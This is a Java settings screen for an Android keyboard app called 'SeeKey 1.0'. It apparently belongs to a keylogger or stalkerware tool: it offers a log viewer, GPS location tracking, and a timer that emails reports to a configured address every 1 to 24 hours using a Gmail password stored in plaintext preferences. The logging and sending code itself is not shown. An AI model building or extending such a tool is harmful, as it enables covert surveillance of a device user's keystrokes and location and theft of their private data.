package com.exa.android.softkeyboard;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.text.InputType;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.CompoundButton.OnCheckedChangeListener;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;
import com.generator.android.softkeyboard.R;


public class Settings extends Activity implements OnCheckedChangeListener{

	private static final String PREFS_NAME = "SettingsConfig";
	private  SharedPreferences.Editor editor;
	private  SharedPreferences settings;
	private  Button listar;
	private  Button buttonSave;
	private  Button buttonCancel;
	private  Button buttonMais;
	private  Button buttonMenos;
	private  TextView textEditTempo;
	private  ToggleButton gpsButton;
	private  ToggleButton emailButton; 
	private  boolean gpsButtonBoo;
	private  boolean emailButtonBoo;
	private int tempoExecucao;
	private String toEmail;
	private String fromEmail;
	private String passEmail;
	private LinearLayout layoutEmailSettings;
	private TextView to;
	private TextView from;
	private TextView pass;
	private EditText toEnvio;
	private EditText fromEnvio;
	private EditText passEnvio;
	private AlertDialog.Builder alertDialog;
	private final int UMAHORASEC = 3600;
	private final int MILESIMO = 1000;


	private static Handler handler;
	private static AgendarEnvio agendarEnvio;
	
	protected void onCreate(Bundle e){
		super.onCreate(e);
		setContentView(R.layout.settings);
		setTitle("SeeKey 1.0");

		handler = new Handler();

		
		settings = getSharedPreferences(PREFS_NAME, 0);

		editor = settings.edit();

		gpsButtonBoo = settings.getBoolean("gpsButtonBoo", false);
		emailButtonBoo = settings.getBoolean("emailButtonBoo", false); 
		tempoExecucao = settings.getInt("tempoExecucao", 1);							
		toEmail = settings.getString("toEmail", "void");
		fromEmail = settings.getString("fromEmail", "void");
		passEmail = settings.getString("passEmail", "void");

		TempoDeExecucao tempoExec = new TempoDeExecucao();

		buttonMenos = (Button) findViewById(R.id.buttonMenos);
		buttonMais =  (Button) findViewById(R.id.buttonMais);
		textEditTempo = (TextView) findViewById(R.id.textViewTempo);

		buttonMenos.setOnClickListener(tempoExec);
		buttonMais.setOnClickListener(tempoExec);

		listar = (Button) findViewById(R.id.buttonVerLog);
		buttonSave  = (Button) findViewById(R.id.buttonSave);
		buttonCancel  = (Button) findViewById(R.id.buttonExit);
		gpsButton = (ToggleButton) findViewById(R.id.toggleButton3);
		emailButton = (ToggleButton) findViewById(R.id.toggleButton1);


		gpsButton.setOnCheckedChangeListener(this);
		emailButton.setOnCheckedChangeListener(this);

		gpsButton.setChecked(gpsButtonBoo);
		emailButton.setChecked(emailButtonBoo);

		textEditTempo.setText(Integer.toString(tempoExecucao));


		loadViewEmail();

			
		
		buttonCancel.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub

				finish();
			}
		});

		buttonSave.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {


				editor.putInt("tempoExecucao", Integer.parseInt(textEditTempo.getText().toString()));							
				editor.commit();
				
                updateTempoExecucao();
				
				if(gpsButton.isChecked()){

					editor.putBoolean("gpsButtonBoo", true);
					editor.commit();

				} else {

					editor.putBoolean("gpsButtonBoo", false);
					editor.commit();	

				}


				if(emailButton.isChecked()){

					editor.putBoolean("emailButtonBoo", true);
					editor.commit();
					
					Log.e("Agendado ", "Settings");
					
					agendarEnvio = new AgendarEnvio(getApplicationContext(),
							 settings.getBoolean("emailButtonBoo", false),
							 settings.getString("fromEmail", "void").trim(), 
							 settings.getString("passEmail", "void").trim(),
							 settings.getString("toEmail", "void").trim());
					
					handler.post(agendarEnvio);
					
					handler.postDelayed(agendarEnvio, (tempoExecucao * UMAHORASEC) * MILESIMO);
					
					


					
				}else{

					editor.putBoolean("emailButtonBoo", false);
					editor.commit();

					handler.removeCallbacks(agendarEnvio);

				}

				

				Toast.makeText(getApplicationContext(),"Save", Toast.LENGTH_SHORT).show();

			}





		});

		listar.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub

				Intent it = new Intent(getApplicationContext(),LoggerView.class);

				startActivity(it);

			}
		});




	}

	public void updateTempoExecucao(){

		tempoExecucao = settings.getInt("tempoExecucao", 1);

	}

	public void showEmailAlert(){


		loadViewEmail();

		alertDialog.setView(layoutEmailSettings);
		// Setting Dialog Title
		alertDialog.setTitle("E-mail settings");

		// Setting Dialog Message
		alertDialog.setMessage("E-mail is not enabled");



		alertDialog.setMessage("Support only Gmail(from).");


		alertDialog.setPositiveButton("Ok", new DialogInterface.OnClickListener() {

			public void onClick(DialogInterface dialog,int which) {

				if(fromEnvio.getText().toString().contains("@gmail.com") ){


					if(passEnvio.getText().toString().length() > 1 ){


						if(fromEnvio.getText().toString().length() > 1){

							editor.putString("toEmail", toEnvio.getText().toString());
							editor.putString("fromEmail", fromEnvio.getText().toString());
							editor.putString("passEmail", passEnvio.getText().toString());
							editor.commit();

						}else{

							Toast.makeText(getApplicationContext(), "Need email to send", Toast.LENGTH_SHORT).show();
							emailButton.setChecked(false);
						}


					}else{

						Toast.makeText(getApplicationContext(), "Need password", Toast.LENGTH_SHORT).show();
						emailButton.setChecked(false);


					}


				}else {

					Toast.makeText(getApplicationContext(), "Support only Gmail", Toast.LENGTH_SHORT).show();
					emailButton.setChecked(false);
				}	


			}
		});

		// on pressing cancel button
		alertDialog.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
			public void onClick(DialogInterface dialog, int which) {

				emailButton.setChecked(false);

				dialog.cancel();
			}
		});



		alertDialog.show();
	}

	public void loadViewEmail(){


		alertDialog = new AlertDialog.Builder(this);


		layoutEmailSettings = new LinearLayout(this);
		layoutEmailSettings.setOrientation(LinearLayout.VERTICAL);


		to = new TextView(this);
		to.setText("To:");

		from = new TextView(this);
		from.setText("From:");

		pass = new TextView(this);
		pass.setText("Password:");

		toEnvio = new EditText(this);
		fromEnvio = new EditText(this);
		passEnvio = new EditText(this);
		passEnvio.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);


		layoutEmailSettings.addView(to);
		layoutEmailSettings.addView(toEnvio);
		layoutEmailSettings.addView(from);
		layoutEmailSettings.addView(fromEnvio);
		layoutEmailSettings.addView(pass);
		layoutEmailSettings.addView(passEnvio);


	}

	public void finish(){
		super.finish();

		settings = getSharedPreferences(PREFS_NAME, 0);
		editor = settings.edit();

		// Commit the edits!
		editor.commit();


	}

	protected void onDestroy(){
		super.onDestroy();

		// We need an Editor object to make preference changes.
		// All objects are from android.context.Context
		settings = getSharedPreferences(PREFS_NAME, 0);
		editor = settings.edit();

		// Commit the edits!
		editor.commit();


	}

	protected void onStop(){
		super.onStop();

		// We need an Editor object to make preference changes.
		// All objects are from android.context.Context
		settings = getSharedPreferences(PREFS_NAME, 0);
		editor = settings.edit();

		// Commit the edits!
		editor.commit();


	}


	public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {


		if(buttonView.equals(emailButton)){

			if(isChecked){
				Log.e("email","Enable");

				if(!fromEmail.contains("@gmail.com") || toEmail.contains("void") || passEmail.contains("void"))
					showEmailAlert();

			}else{

				editor.putBoolean("emailButtonBoo", false);
				editor.commit();

				editor.putString("toEmail", "void");
				editor.putString("fromEmail", "void");
				editor.putString("passEmail", "void");
				editor.commit();

				

			}   

		}

		if(buttonView.equals(gpsButton)){

			if(isChecked){

				buttonView.setActivated(false);

				GPSTracker gps = new GPSTracker(this);

				if(gps.canGetLocation()){


				}else{

					gps.showSettingsAlert();

				}		


			}else{

				buttonView.setActivated(true);




			}
		}
		
		
	}


	private class TempoDeExecucao implements OnClickListener{

		private int tempo = settings.getInt("tempoExecucao", 1);

		@Override
		public void onClick(View v) {

			if(v.equals(buttonMenos)){

				tempo -= tempo > 1 ? 1 : 0;

			}else if(v.equals(buttonMais)){

				tempo += tempo < 24 ? 1 : 0;

			}

			textEditTempo.setText(Integer.toString(tempo));

		}



	}
    /*
	private Runnable timedTask = new Runnable(){

		@Override
		public void run() {



			agendarEnvio = new AgendarEnvio(getApplicationContext(),settings.getBoolean("emailButtonBoo", false)
					,settings.getString("fromEmail", "void"), settings.getString("passEmail", "void"),settings.getString("toEmail", "void"));


			handler.postDelayed(timedTask, (tempoExecucao * UMAHORASEC) * MILESIMO);

			// handler.postDelayed(timedTask,5000);

			agendarEnvio = null;

		}};
  */

}
